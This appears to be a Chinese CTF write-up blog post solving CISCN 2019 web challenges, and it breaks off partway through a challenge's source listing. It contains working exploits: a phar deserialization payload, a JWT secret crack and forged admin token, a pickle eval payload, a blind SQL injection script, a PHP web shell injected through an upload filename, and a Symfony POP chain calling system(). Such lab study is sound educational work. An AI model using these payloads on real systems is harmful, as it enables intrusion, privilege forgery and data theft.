---
title: buuoj刷题记录12-CISCN2019
date: 2020-02-10 00:04:17
tags:
 - web
 - ciscn2019
categories: 
 - 刷题记录
---

## 华北赛区 Day1 Web1 Dropbox

拿到题目是一个登入页面

注册，登入，上传文件

上传一个图片，上传成功。点击下载，下载时发现有任意文件下载漏洞

把文件下载下来进行代码审计

<!--more-->

```php+HTML
//index.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}
?>


<!DOCTYPE html>
<html>

<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<title>网盘管理</title>

<head>
    <link href="static/css/bootstrap.min.css" rel="stylesheet">
    <link href="static/css/panel.css" rel="stylesheet">
    <script src="static/js/jquery.min.js"></script>
    <script src="static/js/bootstrap.bundle.min.js"></script>
    <script src="static/js/toast.js"></script>
    <script src="static/js/panel.js"></script>
</head>

<body>
    <nav aria-label="breadcrumb">
    <ol class="breadcrumb">
        <li class="breadcrumb-item active">管理面板</li>
        <li class="breadcrumb-item active"><label for="fileInput" class="fileLabel">上传文件</label></li>
        <li class="active ml-auto"><a href="#">你好 <?php echo $_SESSION['username']?></a></li>
    </ol>
</nav>
<input type="file" id="fileInput" class="hidden">
<div class="top" id="toast-container"></div>

<?php
include "class.php";

$a = new FileList($_SESSION['sandbox']);
$a->Name();
$a->Size();
?>
```

```php+HTML
//download.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";
ini_set("open_basedir", getcwd() . ":/etc:/tmp");

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename) && stristr($filename, "flag") === false) {   //stristr 搜索字符串在另一字符串中的第一次出现不区分大小写
    Header("Content-type: application/octet-stream");
    Header("Content-Disposition: attachment; filename=" . basename($filename));
    echo $file->close();
} else {
    echo "File not exist";
}
?>

```

```php+HTML
//delete.php
<?php
session_start();
if (!isset($_SESSION['login'])) {
    header("Location: login.php");
    die();
}

if (!isset($_POST['filename'])) {
    die();
}

include "class.php";

chdir($_SESSION['sandbox']);
$file = new File();
$filename = (string) $_POST['filename'];
if (strlen($filename) < 40 && $file->open($filename)) {
    $file->detele();
    Header("Content-type: application/json");
    $response = array("success" => true, "error" => "");
    echo json_encode($response);
} else {
    Header("Content-type: application/json");
    $response = array("success" => false, "error" => "File not exist");
    echo json_encode($response);
}
?>
```

```php+HTML
//register.php
<?php
session_start();
if (isset($_SESSION['login'])) {
    header("Location: index.php");
    die();
}
?>

<!doctype html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <title>注册</title>

  <!-- Bootstrap core CSS -->
  <link href="static/css/bootstrap.min.css" rel="stylesheet">


  <style>
    .bd-placeholder-img {
      font-size: 1.125rem;
      text-anchor: middle;
    }

    @media (min-width: 768px) {
      .bd-placeholder-img-lg {
        font-size: 3.5rem;
      }
    }
  </style>
  <!-- Custom styles for this template -->
  <link href="static/css/std.css" rel="stylesheet">
</head>

<body class="text-center">
  <form class="form-signin" action="register.php" method="POST">
    <h1 class="h3 mb-3 font-weight-normal">注册</h1>
    <label for="username" class="sr-only">Username</label>
    <input type="text" name="username" class="form-control" placeholder="Username" required autofocus>
    <label for="password" class="sr-only">Password</label>
    <input type="password" name="password" class="form-control" placeholder="Password" required>
    <button class="btn btn-lg btn-primary btn-block" type="submit">提交</button>
    <p class="mt-5 mb-3 text-muted">&copy; 2018-2019</p>
  </form>
</body>
<div class="top" id="toast-container"></div>

<script src="static/js/jquery.min.js"></script>
<script src="static/js/bootstrap.bundle.min.js"></script>
<script src="static/js/toast.js"></script>
</html>


<?php
include "class.php";

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $u = new User();
    $username = (string) $_POST["username"];
    $password = (string) $_POST["password"];
    if (strlen($username) < 20 && strlen($username) > 2 && strlen($password) > 1) {
        if ($u->add_user($username, $password)) {
            echo("<script>window.location.href='login.php?register';</script>");
            die();
        } else {
            echo "<script>toast('此用户名已被使用', 'warning');</script>";
            die();
        }
    }
    echo "<script>toast('请输入有效用户名和密码', 'warning');</script>";
}
?>
```

```php+HTML
//class.php
<?php
error_reporting(0);
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "dropbox";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }

    public function user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }

    public function add_user($username, $password) {
        if ($this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }

    public function verify_user($username, $password) {
        if (!$this->user_exist($username)) {
            return false;
        }
        $password = sha1($password . "SiAchGHmFx");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }

    public function __destruct() {
        $this->db->close();
    }
}

class FileList {
    private $files;
    private $results;
    private $funcs;

    public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);   //销毁变量
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
    }

    public function __call($func, $args) {  //调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的
        array_push($this->funcs, $func);   
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    public function __destruct() {
        $table = '<div id="container" class="container"><div class="table-responsive"><table id="table" class="table table-bordered table-hover sm-font">';
        $table .= '<thead><tr>';
        foreach ($this->funcs as $func) {
            $table .= '<th scope="col" class="text-center">' . htmlentities($func) . '</th>';
        }
        $table .= '<th scope="col" class="text-center">Opt</th>';
        $table .= '</thead><tbody>';
        foreach ($this->results as $filename => $result) {
            $table .= '<tr>';
            foreach ($result as $func => $value) {
                $table .= '<td class="text-center">' . htmlentities($value) . '</td>';    //将$value转换为 HTML 实体
            }
            $table .= '<td class="text-center" filename="' . htmlentities($filename) . '"><a href="#" class="download">下载</a> / <a href="#" class="delete">删除</a></td>';
            $table .= '</tr>';
        }
        echo $table;
    }
}

class File {
    public $filename;

    public function open($filename) {
        $this->filename = $filename;
        if (file_exists($filename) && !is_dir($filename)) {
            return true;
        } else {
            return false;
        }
    }

    public function name() {
        return basename($this->filename);  //返回路径中的文件名部分
    }

    public function size() {
        $size = filesize($this->filename);
        $units = array(' B', ' KB', ' MB', ' GB', ' TB');
        for ($i = 0; $size >= 1024 && $i < 4; $i++) $size /= 1024;
        return round($size, 2).$units[$i];
    }

    public function detele() {
        unlink($this->filename);  //删除文件
    }

    public function close() {
        return file_get_contents($this->filename);
    }
}
?>
```

```php+HTML
//login.php
<?php
session_start();
if (isset($_SESSION['login'])) {
    header("Location: index.php");
    die();
}
?>

<!doctype html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <title>登录</title>

  <!-- Bootstrap core CSS -->
  <link href="static/css/bootstrap.min.css" rel="stylesheet">


  <style>
    .bd-placeholder-img {
      font-size: 1.125rem;
      text-anchor: middle;
    }

    @media (min-width: 768px) {
      .bd-placeholder-img-lg {
        font-size: 3.5rem;
      }
    }
  </style>
  <!-- Custom styles for this template -->
  <link href="static/css/std.css" rel="stylesheet">
</head>

<body class="text-center">
  <form class="form-signin" action="login.php" method="POST">
    <h1 class="h3 mb-3 font-weight-normal">登录</h1>
    <label for="username" class="sr-only">Username</label>
    <input type="text" name="username" class="form-control" placeholder="Username" required autofocus>
    <label for="password" class="sr-only">Password</label>
    <input type="password" name="password" class="form-control" placeholder="Password" required>
    <button class="btn btn-lg btn-primary btn-block" type="submit">提交</button>
    <p class="mt-5 text-muted">还没有账号? <a href="register.php">注册</a></p>
    <p class="text-muted">&copy; 2018-2019</p>
  </form>
  <div class="top" id="toast-container"></div>
</body>

<script src="static/js/jquery.min.js"></script>
<script src="static/js/bootstrap.bundle.min.js"></script>
<script src="static/js/toast.js"></script>
</html>


<?php
include "class.php";

if (isset($_GET['register'])) {
    echo "<script>toast('注册成功', 'info');</script>";
}

if (isset($_POST["username"]) && isset($_POST["password"])) {
    $u = new User();
    $username = (string) $_POST["username"];
    $password = (string) $_POST["password"];
    if (strlen($username) < 20 && $u->verify_user($username, $password)) {
        $_SESSION['login'] = true;
        $_SESSION['username'] = htmlentities($username);
        $sandbox = "uploads/" . sha1($_SESSION['username'] . "sftUahRiTz") . "/";
        if (!is_dir($sandbox)) {
            mkdir($sandbox);
        }
        $_SESSION['sandbox'] = $sandbox;
        echo("<script>window.location.href='index.php';</script>");
        die();
    }
    echo "<script>toast('账号或密码错误', 'warning');</script>";
}
?>
```



在class.php中，File::close()可以读取到文件内容

```php
class File {
    public $filename;

    ...

    public function close() {
        return file_get_contents($this->filename);
    }
}
```

User类中的析构函数中有执行close()函数过程

```php
class User {
    public $db;

    public function __construct() {
        global $db;
        $this->db = $db;
    }
    
    ...
    
    public function __destruct() {
        $this->db->close();
    }
}
```

而FileList类中没有close()函数，但是如果调用FileList类中的close（）,就会调用到File类中的close()。从而获取flag的内容

```php
class FileList {
    private $files;
    private $results;
    private $funcs;
    
	public function __construct($path) {
        $this->files = array();
        $this->results = array();
        $this->funcs = array();
        $filenames = scandir($path);

        $key = array_search(".", $filenames);
        unset($filenames[$key]);   //销毁变量
        $key = array_search("..", $filenames);
        unset($filenames[$key]);

        foreach ($filenames as $filename) {
            $file = new File();
            $file->open($path . $filename);
            array_push($this->files, $file);
            $this->results[$file->name()] = array();
        }
   
   
    public function __call($func, $args) {  //调用本类不存在的方法，将方法添加到funcs数组中，并将file类中的
        array_push($this->funcs, $func);   
        foreach ($this->files as $file) {
            $this->results[$file->name()][$func] = $file->$func();
        }
    }

    ...
    
}
```

[关于php反序列化]([https://www.cnblogs.com/20175211lyz/p/11403397.html#%E5%85%ADphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96](https://www.cnblogs.com/20175211lyz/p/11403397.html#六phar反序列化))在刷题记录11当中也有两篇关于phar的文章[参考文章1](https://paper.seebug.org/680/)     [参考文章2](https://xz.aliyun.com/t/2958)

重点在class.php，delete.php，和download.php中

在delete.php、download.php中file_exists会触发phar反序列化漏洞，但是在download.php有设置open_basedir，而delete.php中没有，所以选择delete.php

编写生成phar的脚本

```php
<?php
class User
{
    public $db;
}

class File
{
    public $filename;
}

class FileList
{
    private $files;
    private $results;
    private $funcs;
    public function __construct()
    {
        $file = new File();
        $file->filename="/flag.txt";
        $this->files=array($file);
        // TODO: Implement __destruct() method.
    }
}

$test = new User();
$test->db = new FileList();
$phar = new Phar('s.phar');
$phar->startBuffering();
$phar->setStub("GIF89a __HALT_COMPILER();");
$phar->setMetadata($test);
$phar->addFromString('a','a');
$phar->stopBuffering();

```

将生成的s.phar改后缀为gif，上传，在删除s.gif时，抓包修改filename为`phar://s.gif`

![](/pic/74.png)



## 华北赛区 Day1 Web2 ikun

打开题目有注册界面，先注册，登入

回到首页发现要买到LV6

![](/pic/75.png)

在第181页找到了LV6点击购买

![](/pic/76.png)

抓包发现有一个价格，有一个折扣

```http
POST /shopcar HTTP/1.1
Host: c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 106
Origin: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn
Connection: close
Referer: http://c416cb1a-47f7-491c-bc81-48ea98707fad.node3.buuoj.cn/shopcar
Cookie: _xsrf=2|578fed8a|97f2448968d2a525b9b0490c07c3413f|1581661272; JWT=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78; commodity_id="2|1:0|10:1581662353|12:commodity_id|8:MTYyNA==|e3649aa3872d333d61bd8b14770c0c7ca9c0539d9263777c505ebe2ac3e7e15f"
Upgrade-Insecure-Requests: 1

_xsrf=2%7C83e3992c%7C439e302fbcbed1836ddc3daad3af3599%7C1581661272&id=1624&price=1145141919.0&discount=0.8
```

把价格改成很小发现出错，把折扣改小出现新界面提示需要admin才能访问

![](/pic/77.png)

![](/pic/78.png)

查看cookie，其中有一个JWT、_xsrf、commodity_id

[关于JWT](https://blog.csdn.net/hekewangzi/article/details/72885670)   去jwt.io解析一下

![](/pic/79.png)

使用的是HS256（HMAC SHA256对称加密）算法

使用c-jwt-cracker破解成功，密钥为1Kun

```bash
root@kali:~/tools/c-jwt-cracker# ./jwtcrack eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IjEyMyJ9.t_quUTD2cAx9tGvCi1tmfSmgP_z_hr2N8lx_Ij5bh78
Secret is "1Kun"
```

回到https://jwt.io/#debugger修改username为admin，在下方填入密钥1Kun

![](/pic/80.png)  

然后修改cookie为`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo`

![](/pic/81.png)  

点击页面无反应，查看源码，发现了一个WWW.ZIP

![](/pic/82.png)  

打开发现是tornado的框架

既然PHP有序列化漏洞，python也有，通过pickle模块实现 [参考文章]（https://www.jianshu.com/p/8fd3de5b4843）

在sshop/view/Admin.py中含有序列化漏洞

![](/pic/83.png)

```python
import tornado.web
from sshop.base import BaseHandler
import pickle
import urllib


class AdminHandler(BaseHandler):
    @tornado.web.authenticated
    def get(self, *args, **kwargs):
        if self.current_user == "admin":
            return self.render('form.html', res='This is Black Technology!', member=0)
        else:
            return self.render('no_ass.html')

    @tornado.web.authenticated
    def post(self, *args, **kwargs):
        try:
            become = self.get_argument('become')
            p = pickle.loads(urllib.unquote(become))     
            return self.render('form.html', res=p, member=1)
        except:
            return self.render('form.html', res='This is Black Technology!', member=0)
```

编写exp

```python
import pickle
import urllib

class test(object):
    def __reduce__(self):
        return eval,("open('/flag.txt','r').read()",)
if __name__ == '__main__':
    a = test()
    payload = pickle.dumps(a)
    print(urllib.quote(payload))  #c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27/flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.
    
```

在/b1g_m4mber界面点击一键成为大会员

在BP中修改post中的become数据

![](/pic/84.png)





## 总决赛 Day2 Web1 Easyweb

打开又是一个登入界面，访问robots.txt

```
User-agent: *
Disallow: *.php.bak
```

在登入界面登入后有一个get /image.php?id=1请求

访问/image.php.bak得到源码

```php
<﻿?php
include "config.php";

$id=isset($_GET["id"])?$_GET["id"]:"1";
$path=isset($_GET["path"])?$_GET["path"]:"";

$id=addslashes($id);
$path=addslashes($path);

$id=str_replace(array("\\0","%00","\\'","'"),"",$id);
$path=str_replace(array("\\0","%00","\\'","'"),"",$path); 

$result=mysqli_query($con,"select * from images where id='{$id}' or path='{$path}'");
$row=mysqli_fetch_array($result,MYSQLI_ASSOC);

$path="./" . $row["path"];
header("Content-Type: image/jpeg");
readfile($path);
```

addslashes() 返回字符串，该字符串为了数据库查询语句等的需要在某些字符前加上了反斜线。这些字符是单引号（*'*）、双引号（*"*）、反斜线（*\*）与 NUL（**`NULL`** 字符）。

因为单引号被过滤，刚好又有两个变量，id后面的单引号被转义后，path后面输入的内容就会被当作语句执行，然后把path后面的单引号注释掉就不会报错了。

```
"select * from images where id='\' or path='$path'"    ->
"select * from images where id=' or path=' $path "
```

编写盲注脚本

```python
# -*- coding: utf-8 -*-
# @Time    : 2/14/2020 8:39 PM
import requests

def str2hex(strs):
    hexs='0x'
    for x in range(len(strs)):
        hexs+=hex(ord(strs[x]))[2:]
    print(hexs)
    return hexs

def get(payload):
    url = 'http://48e2e973-9423-4d4e-b6ff-0e79cf4c1a5f.node3.buuoj.cn/image.php?id=\\0&path=or id=('+payload+')--+'
    # print(url)
    html = requests.get(url)
    # print(html)
    return html

def binsea(s_payload,len=999):
    result = ''
    x=1
    while x <= len :
        error = 0
        left = 0
        right = 126
        while left <= right:
            mid = (left + right) / 2
            payload = "if(ascii(substr((%s),%d,1))>%d,1,0)" % (s_payload,x, mid)

            res = get(payload)
            if res.status_code == 404 or res.status_code == 429:
                x=x-1
                error = 1
                break
            html=res.text
            # print(html,'*-*-*-*-*-*', mid)
            if 'F'  in html:
                left = mid +1
            else:
                right = mid -1
        mid = int((left + right + 1) / 2)
        if mid == 0 :
            break
        if error == 0 :
            result += chr(mid)
            print(result)
        x=x+1
    return result

def get_database():
    s_payload='database()'
    database = binsea(s_payload)
    print(database)

def get_tables(db):
    db=str2hex(db)
    s_payload = 'select(group_concat(table_name))from(information_schema.tables)where(table_schema='+db+')'
    tables=binsea(s_payload)

def get_columns(table):
    table = str2hex(table)
    s_payload = 'select(group_concat(column_name))from(information_schema.columns)where(table_name='+table+')'
    columns=binsea(s_payload)

def get_data(columns,table):
    s_payload='select(group_concat('+columns+'))from('+table+')'
    password=binsea(s_payload)


# get_database() #ciscnfinal

# get_tables('ciscnfinal') #images,users

get_data('password','users') #1f97eef3ea37a28db040
```

其实直接猜表为users和栏password就好了   

拿到密码然后登入，登入之后是一个文件上传，随便上传一个文件

```
I logged the file name you uploaded to logs/upload.054981d8766f246f4da3af656bbf6fe9.log.php.
```

修改文件名为

```
Content-Disposition: form-data; name="file"; filename="<?= eval($_POST['cmd']) ?>"
```

短标签<? ?>需要php.ini开启short_open_tag = On，但<?= ?>不受该条控制。

采用js写法的标记发现不起作用。

菜刀连接，flag在根目录，打开即可

![](/pic/85.png)



## 总决赛 Day1 Web4 Laravel1

打开题目，有一段代码，还给出了源码地址，下载整个源码，进行代码审计

```php
 <?php
//backup in source.tar.gz

namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function index(\Illuminate\Http\Request $request){
        $payload=$request->input("payload");
        if(empty($payload)){
            highlight_file(__FILE__);
        }else{
            @unserialize($payload);
        }
    }
} 
```

直接给出了反序列化函数，接下来就是寻找POP链

其中包含命名空间 [关于命名空间](https://www.runoob.com/php/php-namespace.html)

先搜索__destruct，发现很多里面都是空的

![](/pic/86.png)

后面在`vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php`找到一个

![](/pic/87.png)

查看`invalidateTags`方法的定义

![](/pic/88.png)

其中有一个`saveDeferred`，全局搜索看看，找到了`vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/ProxyAdapter.php`

![](/pic/89.png)

接着看`dosave`，就在当前页面的下面

![](/pic/90.png)

此处存在动态调用可以调用到`system()`

![](/pic/91.png)

`$this->setInnerItem`可控，`$innerItem`是我们传入的`$item`类中的`$innerItem`属性

这里可以看到有 **$item[“\0\*\0expiry”]**、**$item[“\0\*\0poolHash”]** 这种写法，数组键名带有 **\0\*\0** 。这实际上是类中，修饰符为 **protected** 的属性，在类强转成数组之后的结果

![](/pic/92.png)

构造payload

```php
<?php
namespace Symfony\Component\Cache;
class CacheItem 
{

    protected $innerItem = 'cat /flag';

}

namespace Symfony\Component\Cache\Adapter;

class ProxyAdapter
{
	private $setInnerItem = 'system';
}

class TagAwareAdapter
{
	public $deferred = [];
	public function __construct()
    {
    	$this->pool = new ProxyAdapter();

    }
}

$a = new TagAwareAdapter();
$a -> deferred = array('a' => new \Symfony\Component\Cache\CacheItem);
echo urlencode(serialize($a));  
```

payload

```
?payload=O%3A47%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CTagAwareAdapter%22%3A2%3A%7Bs%3A8%3A%22deferred%22%3Ba%3A1%3A%7Bs%3A1%3A%22a%22%3BO%3A33%3A%22Symfony%5CComponent%5CCache%5CCacheItem%22%3A1%3A%7Bs%3A12%3A%22%00%2A%00innerItem%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7D%7Ds%3A4%3A%22pool%22%3BO%3A44%3A%22Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%22%3A1%3A%7Bs%3A58%3A%22%00Symfony%5CComponent%5CCache%5CAdapter%5CProxyAdapter%00setInnerItem%22%3Bs%3A6%3A%22system%22%3B%7D%7D
```

![](/pic/93.png)





## 华北赛区 Day1 Web5 CyberPunk

是一个登入页面，查看网页源码，在最后发现了

```
<!--?file=?-->
```

可能是文件下载或者是文件包含

```
payload=/index.php?file=index.php   返回数据为空
```

尝试使用伪协议

```
payload=/index.php?file=php://filter/convert.base64-encode/resource=index.php
```

读取成功

```php+HTML
//index.php
<?php

ini_set('open_basedir', '/var/www/html/');

// $file = $_GET["file"];
$file = (isset($_GET['file']) ? $_GET['file'] : null);
if (isset($file)){
    if (preg_match("/phar|zip|bzip2|zlib|data|input|%00/i",$file)) {
        echo('no way!');
        exit;
    }
    @include($file);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>index</title>
<base href="./">
<meta charset="utf-8" />

<link href="assets/css/bootstrap.css" rel="stylesheet">
<link href="assets/css/custom-animations.css" rel="stylesheet">
<link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
	<div class="container">
        <h2>2077发售了,不来份实体典藏版吗?</h2>
        <img class="logo" src="./assets/img/logo-en.png"><!--LOGOLOGOLOGOLOGO-->
        <div class="row">
			<div class="col-md-8 col-md-offset-2 centered">
                <h3>提交订单</h3>
                <form role="form" action="./confirm.php" method="post" enctype="application/x-www-urlencoded">
                    <p>
                    <h3>姓名:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>电话:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    <h3>地址:</h3>
                    <input type="text" class="subscribe-input" name="address">
                    </p>
                    <button class='btn btn-lg  btn-sub btn-white' type="submit">我正是送钱之人</button>
                </form>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
		<div class="row">
            <h2 class="mb">订单管理</h2>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
            </a>
            <a href="./change.php">
                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
            </a>
		</div>
	</div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
<!--?file=?-->
```

```php+HTML
//search.php
<?php

require_once "config.php"; 

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        if(!$row) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "<p>姓名:".$row['user_name']."</p><p>, 电话:".$row['phone']."</p><p>, 地址:".$row['address']."</p>";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>搜索</title>
<base href="./">

<link href="assets/css/bootstrap.css" rel="stylesheet">
<link href="assets/css/custom-animations.css" rel="stylesheet">
<link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
	<div class="container">
		<div class="row">
			<div class="col-md-8 col-md-offset-2 centered">
                <p style="margin:35px 0;"><br></p>
                <h1>订单查询</h1>
                <form method="post">
                    <p>
                    <h3>姓名:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>电话:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    </p>
                    <p>
                    <button class='btn btn-lg  btn-sub btn-white' type="submit">查询订单</button>
                    </p>
                </form>
                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
		<div class="row">
            <p style="margin:35px 0;"><br></p>
            <h2 class="mb">订单管理</h2>
            <a href="./index.php">
                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>
            </a>
            <a href="./change.php">
                <button class="btn btn-lg btn-register btn-white" >我要修改收货地址</button>
            </a> 
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
            </a>    
		</div>
	</div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
```

```php+HTML
//change.php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["address"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $address = addslashes($_POST["address"]);
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $sql = "update `user` set `address`='".$address."', `old_address`='".$row['address']."' where `user_id`=".$row['user_id'];
        $result = $db->query($sql);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单修改成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>修改收货地址</title>
<base href="./">

<link href="assets/css/bootstrap.css" rel="stylesheet">
<link href="assets/css/custom-animations.css" rel="stylesheet">
<link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
	<div class="container">
		<div class="row">
			<div class="col-md-8 col-md-offset-2 centered">
                <p style="margin:35px 0;"><br></p>
                <h1>修改收货地址</h1>
                <form method="post">
                    <p>
                    <h3>姓名:</h3>
                    <input type="text" class="subscribe-input" name="user_name">
                    <h3>电话:</h3>
                    <input type="text" class="subscribe-input" name="phone">
                    <h3>地址:</h3>
                    <input type="text" class="subscribe-input" name="address">
                    </p>
                    <p>
                    <button class='btn btn-lg  btn-sub btn-white' type="submit">修改订单</button>
                    </p>
                </form>
                <?php global $msg; echo '<h2 class="mb">'.$msg.'</h2>';?>
            </div>
        </div>
    </div>
</div>

<div id="f">
    <div class="container">
		<div class="row">
            <p style="margin:35px 0;"><br></p>
            <h2 class="mb">订单管理</h2>
            <a href="./index.php">
                <button class='btn btn-lg btn-register btn-sub btn-white'>返回</button>
            </a>
            <a href="./search.php">
                <button class="btn btn-lg btn-register btn-white" >我要查订单</button>
            </a>
            <a href="./delete.php">
                <button class="btn btn-lg btn-register btn-white" >我不想要了</button>
            </a>
		</div>
	</div>
</div>

<script src="assets/js/jquery.min.js"></script>
<script src="assets/js/bootstrap.min.js"></script>
<script src="assets/js/retina-1.1.0.js"></script>
<script src="assets/js/jquery.unveilEffects.js"></script>
</body>
</html>
```

```php+HTML
//delete.php
<?php

require_once "config.php";

if(!empty($_POST["user_name"]) && !empty($_POST["phone"]))
{
    $msg = '';
    $pattern = '/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i';
    $user_name = $_POST["user_name"];
    $phone = $_POST["phone"];
    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone)){ 
        $msg = 'no sql inject!';
    }else{
        $sql = "select * from `user` where `user_name`='{$user_name}' and `phone`='{$phone}'";
        $fetch = $db->query($sql);
    }

    if (isset($fetch) && $fetch->num_rows>0){
        $row = $fetch->fetch_assoc();
        $result = $db->query('delete from `user` where `user_id`=' . $row["user_id"]);
        if(!$result) {
            echo 'error';
            print_r($db->error);
            exit;
        }
        $msg = "订单删除成功";
    } else {
        $msg = "未找到订单!";
    }
}else {
    $msg = "信息不全";
}
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>删除订单</title>
<base href="./">
<meta charset="utf-8" />

<link href="assets/css/bootstrap.css" rel="stylesheet">
<link href="assets/css/custom-animations.css" rel="stylesheet">
<link href="assets/css/style.css" rel="stylesheet">

</head>
<body>
<div id="h">
	<div class="container">
		<div class="row">
			<div class="col-md-8 col-md-offset-2 centered">
                <p style="margin:35px 0;"><br></p>
